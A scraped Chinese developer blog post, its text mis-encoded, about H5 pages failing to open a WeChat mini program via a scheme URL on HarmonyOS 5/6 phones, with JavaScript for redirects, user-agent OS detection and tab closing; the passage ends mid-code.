                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>çº¿ä¸Šé¸¿è’™5ã€6ç”¨æˆ·h5é¡µé¢ä½¿ç”¨schemeURLè·³è½¬å°ç¨‹åºå¤±è´¥</p>
<h2 data-id="heading-0">æƒ…å†µæè¿°</h2>
<ul>
<li>iosç”¨æˆ·è‡ªåŠ¨è·³è½¬æˆåŠŸ</li>
<li>å®‰å“ç”¨æˆ·è‡ªåŠ¨è·³è½¬æˆåŠŸ</li>
<li>æµ‹è¯•æœºé¸¿è’™5ã€6è·³è½¬æˆåŠŸ</li>
</ul>
<h3 data-id="heading-1">å®¢æˆ·ç»ç†æä¾›ç”¨æˆ·æ‰‹æœºæˆªå›¾ï¼š</h3>
<p>çº¿ä¸Šç”¨æˆ·è‡ªåŠ¨è·³è½¬åˆ°ç½‘å€ä¸ºï¼šweixin://dl/business/?t=xxxçš„ç½‘å€äº†ï¼Œæ²¡æœ‰æ‹‰èµ·å¾®ä¿¡å°ç¨‹åº</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13b899241a464038ba16ac429b8d5b4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b-r5LmQ5pif55CDMzcy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768542802&amp;x-signature=JJJa21bz3WscTplIK10WC94oCSc%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">çº¿ä¸Šç”¨æˆ·æ‰‹æœºé¸¿è’™5ã€6è·³è½¬å¤±è´¥</h3>
<pre><code class="hljs"/></pre>
<h3 data-id="heading-3">æµ‹è¯•æœºé¸¿è’™5ã€6è·³è½¬æˆåŠŸè·å–åˆ°çš„useragentèƒ½å¤Ÿè‡ªåŠ¨ã€ç‚¹å‡»æŒ‰é’®è·³è½¬</h3>
<p>è®¿é—®åŒäº‹å‘ç°ï¼Œç§°æ‰‹æœºéçº¯è¡€é¸¿è’™</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">userAgent:</span> Mozilla/<span class="hljs-number">5.0</span>(Phone;OpenHarmony <span class="hljs-number">6.0</span>; Android <span class="hljs-number">10</span>)AppleWebKit/<span class="hljs-number">537.36</span>(KHTML,<span class="hljs-built_in">like</span> Gecko) Chrome/<span class="hljs-number">132.0</span>.<span class="hljs-number">0.0</span>Safari/<span class="hljs-number">537.36</span> ArkWeb/<span class="hljs-number">6.0</span>.<span class="hljs-number">0.120</span>MobileHuaweiBrowser/<span class="hljs-number">5.1</span>.<span class="hljs-number">11.312d</span>ata<span class="hljs-string">"ä¸
æ”¯æŒ
</span></code></pre>
<h3 data-id="heading-4">é—®é¢˜åŸå› </h3>
<ol>
<li>æ— æ³•ç¡®è®¤æ˜¯çº¯è¡€é¸¿è’™è¿˜æ˜¯éçº¯è¡€é¸¿è’™åŸå› ï¼Ÿ</li>
<li>æ˜¯æµè§ˆå™¨é—®é¢˜ï¼Ÿå…¼å®¹æ€§æˆ–è€…éšç§è®¾ç½®é—®é¢˜ï¼Ÿ</li>
<li>å¦‚ä½•åŒºåˆ†çº¯è¡€é¸¿è’™ã€éçº¯è¡€é¸¿è’™ï¼Ÿ</li>
</ol>
<p>ä»¥ä¸Šé—®é¢˜ï¼Œæƒ³å’Œå®¢æˆ·æ±‚è¯ï¼Œè¿˜åœ¨ç­‰è´Ÿè´£äººæ¨è¿›...</p>
<h2 data-id="heading-5">å…³é”®ä»£ç </h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// schemeURLå¯†æ–‡åœ°å€</span>
<span class="hljs-keyword">let</span> url = <span class="hljs-string">'weixin://dl/business/?t=xxx'</span>  

<span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {  
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {  
<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">'weixin://dl/business/?t=xxx'</span>;  
}, <span class="hljs-number">500</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">jumpTo1</span>(<span class="hljs-params"/>){  
<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = url;  
}  
<span class="hljs-keyword">function</span> <span class="hljs-title function_">jumpTo2</span>(<span class="hljs-params"/>){  
<span class="hljs-keyword">const</span> ifr = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'iframe'</span>);  
ifr.<span class="hljs-property">src</span> = url;  
ifr.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;  
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(ifr);  
<span class="hljs-comment">// å¯é€‰ï¼šå»¶æ—¶ç§»é™¤ï¼Œé¿å…å½±å“  </span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {  
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(ifr);  
}, <span class="hljs-number">2000</span>);  
}  
<span class="hljs-keyword">function</span> <span class="hljs-title function_">jumpTo3</span>(<span class="hljs-params"/>){  
<span class="hljs-keyword">const</span> a = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'a'</span>);  
a.<span class="hljs-property">href</span> = url;  
a.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;  
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(a);  
a.<span class="hljs-title function_">click</span>();  
<span class="hljs-comment">// å¯é€‰ï¼šå»¶æ—¶ç§»é™¤ï¼Œé¿å…å½±å“  </span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {  
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(a);  
}, <span class="hljs-number">2000</span>);  
}
</code></pre>
<h2 data-id="heading-6">æºä»£ç </h2>
<p>jspé¡µé¢</p>
<pre><code class="hljs language-jsp" lang="jsp">&lt;div class=<span class="hljs-string">"container"</span> id=<span class="hljs-string">"arcode"</span>&gt;  
&lt;div class=<span class="hljs-string">"note"</span>&gt;  
&lt;strong&gt;æ¸©é¦¨æç¤ºï¼š&lt;/strong&gt;æ­¤åŠŸèƒ½éœ€è¦åœ¨å¾®ä¿¡å¤–æµè§ˆå™¨æ‰“å¼€ï¼Œå¦‚æ‰‹æœºè‡ªå¸¦æµè§ˆå™¨ã€Safariæˆ–Chromeç­‰ã€‚  
&lt;/div&gt;  
  
&lt;%-- &lt;button class=<span class="hljs-string">"jump-btn"</span> onclick=<span class="hljs-string">"loadScheme('develop')"</span>&gt;å¯†æ–‡å¼€å‘ç‰ˆæœ¬&lt;/button&gt;--%&gt;  
&lt;%-- &lt;button class=<span class="hljs-string">"jump-btn"</span> onclick=<span class="hljs-string">"loadMWScheme()"</span>&gt;æ˜æ–‡è·³è½¬å°ç¨‹åº&lt;/button&gt;--%&gt;  
&lt;div&gt;  
&lt;button id=<span class="hljs-string">"hmbtn"</span> class=<span class="hljs-string">"jump-btn"</span> onclick=<span class="hljs-string">"joinWhiteList()"</span> style=<span class="hljs-string">"display:none"</span>&gt; è¿›å…¥å°ç¨‹åº&lt;/button&gt;  
&lt;button id=<span class="hljs-string">"fhmbtn2"</span> class=<span class="hljs-string">"jump-btn"</span> onclick=<span class="hljs-string">"loadScheme()"</span> style=<span class="hljs-string">"display:none"</span>&gt; è¿›å…¥å°ç¨‹åº&lt;/button&gt;  
&lt;button id=<span class="hljs-string">"hmbtn2"</span> class=<span class="hljs-string">"jump-btn"</span> onclick=<span class="hljs-string">"joinWhiteList()"</span> style=<span class="hljs-string">"display:none"</span>&gt; ä¸ŠæŠ¥è®¾å¤‡ä¿¡æ¯&lt;/button&gt;  
&lt;/div&gt;  
&lt;p id=<span class="hljs-string">"device3"</span> style=<span class="hljs-string">"color: red"</span>&gt;&lt;/p&gt;  
&lt;p id=<span class="hljs-string">"device"</span>&gt;&lt;/p&gt;  
&lt;div class=<span class="hljs-string">"steps"</span>&gt;  
&lt;p&gt;&lt;strong&gt;è·³è½¬è¯´æ˜ï¼š&lt;/strong&gt;&lt;/p&gt;  
&lt;ul&gt;  
&lt;li&gt;ç¡®ä¿æ‚¨å·²å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„å¾®ä¿¡App&lt;/li&gt;  
&lt;/ul&gt;  
&lt;/div&gt;  
  
&lt;div class=<span class="hljs-string">"qr-code"</span>&gt;  
&lt;div class=<span class="hljs-string">"qr-placeholder"</span> v-loading=<span class="hljs-string">"loading"</span>&gt;  
&lt;view id=<span class="hljs-string">"mini"</span>&gt;&lt;/view&gt;  
&lt;/div&gt;  
&lt;p&gt;å¦‚æœ‰é—®é¢˜ï¼Œè¯·è”ç³»å®¢æœæ”¯æŒ&lt;/p&gt;  
&lt;/div&gt;  
  
&lt;/div&gt;  
  
&lt;script&gt;  
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({  
el: <span class="hljs-string">'#arcode'</span>,  
data() {  
<span class="hljs-keyword">return</span> {  
loading: <span class="hljs-literal">false</span>,  
};  
},  
});  
  
<span class="hljs-type">const</span> <span class="hljs-variable">baseURL</span> <span class="hljs-operator">=</span> <span class="hljs-string">"&lt;%=basePath%&gt;"</span>  
<span class="hljs-type">const</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> axios.create({  
baseURL: baseURL,  
timeout: <span class="hljs-number">15000</span>,  
withCredentials: <span class="hljs-literal">true</span>,  
})  
  
service.interceptors.request.use(config =&gt; {  
<span class="hljs-keyword">if</span> (config.method === <span class="hljs-string">'get'</span>) {  
<span class="hljs-keyword">if</span> (config.params) {  
config.params[<span class="hljs-string">'date'</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().getTime()  
} <span class="hljs-keyword">else</span> {  
config.url = config.url + `?date=` + <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().getTime()  
}  
}  
<span class="hljs-keyword">return</span> config  
}, error =&gt; {  
ELEMENT.Message({  
message: <span class="hljs-string">'é”™è¯¯ä¿¡æ¯ï¼š'</span> + error,  
type: <span class="hljs-string">'warning'</span>  
});  
<span class="hljs-keyword">return</span> Promise.reject(error)  
})  
  
service.interceptors.response.use(resData =&gt; {  
<span class="hljs-keyword">if</span> (resData.headers[<span class="hljs-string">'content-disposition'</span>]) {  
resData.data.contentDisposition = resData.headers[<span class="hljs-string">'content-disposition'</span>]  
}  
<span class="hljs-keyword">if</span> (resData.status &gt;= <span class="hljs-number">200</span> &amp;&amp; resData.status &lt; <span class="hljs-number">300</span>) {  
const {code, result, msg} = resData.data  
<span class="hljs-title function_">if</span> <span class="hljs-params">(code === <span class="hljs-number">1</span>)</span> {  
<span class="hljs-keyword">return</span> result  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (code === <span class="hljs-number">10012</span>) {  
ELEMENT.Message({  
message: <span class="hljs-string">'tokenå·²è¿‡æœŸï¼Œè¯·æ‚¨é‡æ–°ç™»å½•ï¼'</span>,  
type: <span class="hljs-string">'warning'</span>  
});  
setTimeout(() =&gt; location.reload(), <span class="hljs-number">1500</span>);  
<span class="hljs-keyword">return</span> Promise.reject(code)  
} <span class="hljs-keyword">else</span> {  
<span class="hljs-keyword">if</span> (msg == undefined) {  
<span class="hljs-keyword">return</span> resData  
}  
ELEMENT.Message({  
message: msg,  
type: <span class="hljs-string">'warning'</span>  
});  
<span class="hljs-keyword">return</span> Promise.reject(code)  
}  
}  
}, error =&gt; {  
ELEMENT.Message({  
message: <span class="hljs-string">'é”™è¯¯ä¿¡æ¯ï¼š'</span> + error,  
type: <span class="hljs-string">'warning'</span>  
});  
<span class="hljs-keyword">return</span> Promise.reject(error)  
})  
  
function <span class="hljs-title function_">GetWxMiniScheme</span><span class="hljs-params">(code, ticket, version)</span> {  
<span class="hljs-keyword">return</span> service({  
method: <span class="hljs-string">'GET'</span>,  
url: <span class="hljs-string">'/api/scheme/getWxMiniScheme/'</span> + code + <span class="hljs-string">'/'</span> + ticket + <span class="hljs-string">'/'</span> + version,  
})  
}  
  
function <span class="hljs-title function_">AddWhitelist</span><span class="hljs-params">(ticket, model)</span> {  
<span class="hljs-keyword">return</span> service({  
method: <span class="hljs-string">'GET'</span>,  
url: <span class="hljs-string">'/api/scheme/addWhitelist/'</span> + ticket + <span class="hljs-string">'/'</span> + model,  
})  
}  
  
<span class="hljs-type">var</span> <span class="hljs-variable">ticket</span> <span class="hljs-operator">=</span> `${ticket}`;  
<span class="hljs-type">const</span> <span class="hljs-variable">paramscom</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(window.location.search);  
ticket = paramscom.get(<span class="hljs-string">'ticket'</span>);  
<span class="hljs-comment">// ç³»ç»Ÿ  </span>
<span class="hljs-type">let</span> <span class="hljs-variable">ua</span> <span class="hljs-operator">=</span> navigator.userAgent.toLowerCase();  
<span class="hljs-type">let</span> <span class="hljs-variable">isHo</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>  
  
<span class="hljs-comment">// 1. è¯†åˆ«é¸¿è’™ç³»ï¼ˆä¼˜å…ˆçº§æœ€é«˜ï¼Œé¿å…è¢«å®‰å“è¯†åˆ«è¦†ç›–ï¼‰  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">isOpenHarmony</span> <span class="hljs-operator">=</span> /openharmony\s?([<span class="hljs-number">0</span>-<span class="hljs-number">9.</span>_]+)/i.test(ua) || /openharmony\/([<span class="hljs-number">0</span>-<span class="hljs-number">9.</span>_]+)/i.test(ua);  
<span class="hljs-type">const</span> <span class="hljs-variable">openHarmonyVersion</span> <span class="hljs-operator">=</span> (ua.match(/openharmony\s?([<span class="hljs-number">0</span>-<span class="hljs-number">9.</span>_]+)/i) || ua.match(/openharmony\/([<span class="hljs-number">0</span>-<span class="hljs-number">9.</span>_]+)/i) || [])[<span class="hljs-number">1</span>] || <span class="hljs-string">''</span>;  
  
<span class="hljs-type">const</span> <span class="hljs-variable">isHarmonyOS</span> <span class="hljs-operator">=</span> /harmonyos\s?([<span class="hljs-number">0</span>-<span class="hljs-number">9.</span>_]+)/i.test(ua) || /harmonyos\/([<span class="hljs-number">0</span>-<span class="hljs-number">9.</span>_]+)/i.test(ua);  
<span class="hljs-type">const</span> <span class="hljs-variable">harmonyOSVersion</span> <span class="hljs-operator">=</span> (ua.match(/harmonyos\s?([<span class="hljs-number">0</span>-<span class="hljs-number">9.</span>_]+)/i) || ua.match(/harmonyos\/([<span class="hljs-number">0</span>-<span class="hljs-number">9.</span>_]+)/i) || [])[<span class="hljs-number">1</span>] || <span class="hljs-string">''</span>;  
  
<span class="hljs-comment">// 2. è¯†åˆ«iOSï¼ˆåŒ…å«iPhone/iPad/iPodï¼‰  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">isIOS</span> <span class="hljs-operator">=</span> /iphone|ipad|ipod|ios/i.test(ua);  
<span class="hljs-type">const</span> <span class="hljs-variable">iosVersion</span> <span class="hljs-operator">=</span> (ua.match(/os\s+(\d+[._]\d+)/i) || [])[<span class="hljs-number">1</span>]?.replace(<span class="hljs-string">'_'</span>, <span class="hljs-string">'.'</span>) || <span class="hljs-string">''</span>;  
  
<span class="hljs-comment">// 3. è¯†åˆ«å®‰å“  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">isAndroid</span> <span class="hljs-operator">=</span> /android|adr/i.test(ua) &amp;&amp; !isOpenHarmony &amp;&amp; !isHarmonyOS; <span class="hljs-comment">// æ’é™¤é¸¿è’™ï¼ˆé¸¿è’™UAå«androidï¼‰  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">androidVersion</span> <span class="hljs-operator">=</span> (ua.match(/android\s+(\d+[._]\d+)/i) || [])[<span class="hljs-number">1</span>]?.replace(<span class="hljs-string">'_'</span>, <span class="hljs-string">'.'</span>) || <span class="hljs-string">''</span>;  
  
<span class="hljs-comment">// 4. è¯†åˆ«Windows Phone  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">isWindowsPhone</span> <span class="hljs-operator">=</span> /windows phone|wp/i.test(ua);  
<span class="hljs-type">const</span> <span class="hljs-variable">wpVersion</span> <span class="hljs-operator">=</span> (ua.match(/windows phone\s+(\d+[._]\d+)/i) || [])[<span class="hljs-number">1</span>]?.replace(<span class="hljs-string">'_'</span>, <span class="hljs-string">'.'</span>) || <span class="hljs-string">''</span>;  
  
<span class="hljs-comment">// 5. è¯†åˆ«å…¶ä»–ç³»ç»Ÿï¼ˆLinux/MacOS/Windowsï¼‰  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> /linux/i.test(ua) &amp;&amp; !isAndroid &amp;&amp; !isOpenHarmony &amp;&amp; !isHarmonyOS;  
<span class="hljs-type">const</span> <span class="hljs-variable">isMacOS</span> <span class="hljs-operator">=</span> /mac os x/i.test(ua);  
<span class="hljs-type">const</span> <span class="hljs-variable">isWindows</span> <span class="hljs-operator">=</span> /windows|win32/i.test(ua);  
  
<span class="hljs-comment">// 6. æœ€ç»ˆç³»ç»Ÿç±»å‹å’Œç‰ˆæœ¬èµ‹å€¼ï¼ˆæ— Unknownï¼‰  </span>
<span class="hljs-type">let</span> <span class="hljs-variable">systemType</span> <span class="hljs-operator">=</span> <span class="hljs-string">''</span>;  
<span class="hljs-type">let</span> <span class="hljs-variable">systemVersion</span> <span class="hljs-operator">=</span> <span class="hljs-string">''</span>;  
  
<span class="hljs-keyword">if</span> (isOpenHarmony) {  
systemType = <span class="hljs-string">'OpenHarmony'</span>;  
systemVersion = openHarmonyVersion;  
isHo = <span class="hljs-literal">true</span>  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isHarmonyOS) {  
systemType = <span class="hljs-string">'HarmonyOS'</span>;  
systemVersion = harmonyOSVersion;  
isHo = <span class="hljs-literal">true</span>  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isIOS) {  
systemType = <span class="hljs-string">'iOS'</span>;  
systemVersion = iosVersion;  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isAndroid) {  
systemType = <span class="hljs-string">'Android'</span>;  
systemVersion = androidVersion;  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isWindowsPhone) {  
systemType = <span class="hljs-string">'Windows Phone'</span>;  
systemVersion = wpVersion;  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isLinux) {  
systemType = <span class="hljs-string">'Linux'</span>;  
systemVersion = <span class="hljs-string">''</span>;  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isMacOS) {  
systemType = <span class="hljs-string">'MacOS'</span>;  
systemVersion = (ua.match(/mac os x\s+(\d+[._]\d+)/i) || [])[<span class="hljs-number">1</span>]?.replace(<span class="hljs-string">'_'</span>, <span class="hljs-string">'.'</span>) || <span class="hljs-string">''</span>;  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isWindows) {  
systemType = <span class="hljs-string">'Windows'</span>;  
systemVersion = (ua.match(/windows nt\s+(\d+[._]\d+)/i) || [])[<span class="hljs-number">1</span>]?.replace(<span class="hljs-string">'_'</span>, <span class="hljs-string">'.'</span>) || <span class="hljs-string">''</span>;  
} <span class="hljs-keyword">else</span> {  
<span class="hljs-comment">// å…œåº•ï¼šä»è¯†åˆ«ä¸å‡ºåˆ™æ˜¾ç¤ºã€ŒOtherã€è€ŒéUnknown  </span>
systemType = <span class="hljs-string">'Other'</span>;  
systemVersion = <span class="hljs-string">''</span>;  
}  
<span class="hljs-comment">// æ‰“å°æœ€ç»ˆç»“æœï¼ˆæ— Unknownï¼‰  </span>
console.log(<span class="hljs-string">'ç³»ç»Ÿç±»å‹:'</span>, systemType, <span class="hljs-string">'ç‰ˆæœ¬å·:'</span>, systemVersion);  
<span class="hljs-type">const</span> <span class="hljs-variable">deviceInfo</span> <span class="hljs-operator">=</span> {  
systemType,  
systemVersion,  
userAgent: navigator.userAgent,  
platform: navigator.platform,  
time: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().toISOString()  
};  
<span class="hljs-type">const</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> document.querySelector(<span class="hljs-string">'#device'</span>);  
<span class="hljs-type">const</span> <span class="hljs-variable">p3</span> <span class="hljs-operator">=</span> document.querySelector(<span class="hljs-string">'#device3'</span>);  
p.style.whiteSpace = <span class="hljs-string">'pre-wrap'</span>;  
p.innerText = <span class="hljs-string">'ç³»ç»Ÿç±»å‹:'</span> + deviceInfo.systemType + <span class="hljs-string">'\n'</span> + <span class="hljs-string">'ç‰ˆæœ¬å·:'</span> + deviceInfo.systemVersion + <span class="hljs-string">'\nå¹³å°:'</span> + deviceInfo.platform + <span class="hljs-string">'\n'</span> + <span class="hljs-string">'UserAgent: '</span> + deviceInfo.userAgent + <span class="hljs-string">'data"'</span> + (navigator.userAgentData ? JSON.stringify(navigator.userAgentData) : <span class="hljs-string">'ä¸æ”¯æŒ'</span>);  
  
  
<span class="hljs-comment">// é¡µé¢åŠ è½½åå»¶è¿Ÿæ‰§è¡Œè·³è½¬  </span>
window.onload = function () {  
<span class="hljs-keyword">if</span> (isHo) {  
document.getElementById(<span class="hljs-string">'hmbtn'</span>).style.display = <span class="hljs-string">'block'</span>;  
document.getElementById(<span class="hljs-string">'hmtext'</span>).style.display = <span class="hljs-string">'block'</span>;  
} <span class="hljs-keyword">else</span> {  
<span class="hljs-comment">// éé¸¿è’™ç³»ç»Ÿè‡ªåŠ¨è·³è½¬-æ˜¾ç¤ºä¸ŠæŠ¥ä¿¡æ¯æŒ‰é’®(åŠ ç™½åå•)  </span>
setTimeout(() =&gt; {  
loadScheme()  
}, <span class="hljs-number">500</span>);  
}  
  
  
};  
  
<span class="hljs-comment">// ã€æ ¸å¿ƒã€‘å…¨æµè§ˆå™¨é€‚é…çš„æ¸…ç†é€»è¾‘ï¼ˆå«å¤¸å…‹/åä¸ºï¼‰  </span>
function <span class="hljs-title function_">clearH5PageAfterJump</span><span class="hljs-params">()</span> {  
<span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šè¯†åˆ«æµè§ˆå™¨ç±»å‹  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">ua</span> <span class="hljs-operator">=</span> navigator.userAgent.toLowerCase();  
<span class="hljs-type">const</span> <span class="hljs-variable">browserType</span> <span class="hljs-operator">=</span> {  
isHuawei: ua.includes(<span class="hljs-string">'huaweibrowser'</span>) || ua.includes(<span class="hljs-string">'harmony'</span>) || ua.includes(<span class="hljs-string">'huawei'</span>),  
isQuark: ua.includes(<span class="hljs-string">'quark'</span>) || ua.includes(<span class="hljs-string">'quarkmini'</span>),  
isChrome: ua.includes(<span class="hljs-string">'chrome'</span>) &amp;&amp; !ua.includes(<span class="hljs-string">'mobile safari'</span>),  
isSafari: ua.includes(<span class="hljs-string">'mobile safari'</span>) &amp;&amp; !ua.includes(<span class="hljs-string">'chrome'</span>),  
isOther: <span class="hljs-literal">true</span>  
};  
<span class="hljs-comment">// ä¿®æ­£otheråˆ¤æ–­  </span>
browserType.isOther = !browserType.isHuawei &amp;&amp; !browserType.isQuark &amp;&amp; !browserType.isChrome &amp;&amp; !browserType.isSafari;  
  
<span class="hljs-keyword">try</span> {  
<span class="hljs-comment">// 1. åä¸ºæµè§ˆå™¨ï¼šä¼˜å…ˆè°ƒç”¨ä¸“å±API  </span>
<span class="hljs-keyword">if</span> (browserType.isHuawei &amp;&amp; window.HuaweiBrowser) {  
window.HuaweiBrowser.closeCurrentTab();  
}  
<span class="hljs-comment">// 2. é€šç”¨å…³é—­å°è¯•ï¼ˆä»…éƒ¨åˆ†æµè§ˆå™¨ç”Ÿæ•ˆï¼‰  </span>
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (window.close) {  
window.close();  
setTimeout(() =&gt; window.close(), <span class="hljs-number">200</span>);  
}  
} <span class="hljs-keyword">catch</span> (e) {  
console.log(<span class="hljs-string">'è‡ªåŠ¨å…³é—­å¤±è´¥ï¼Œæ‰§è¡Œå¼ºåˆ¶æ¸…ç©º'</span>, e);  
  
<span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šåˆ†æµè§ˆå™¨å¼ºåˆ¶æ¸…ç©ºï¼ˆæ ¸å¿ƒé€‚é…å¤¸å…‹ï¼‰  </span>
<span class="hljs-keyword">if</span> (browserType.isQuark) {  
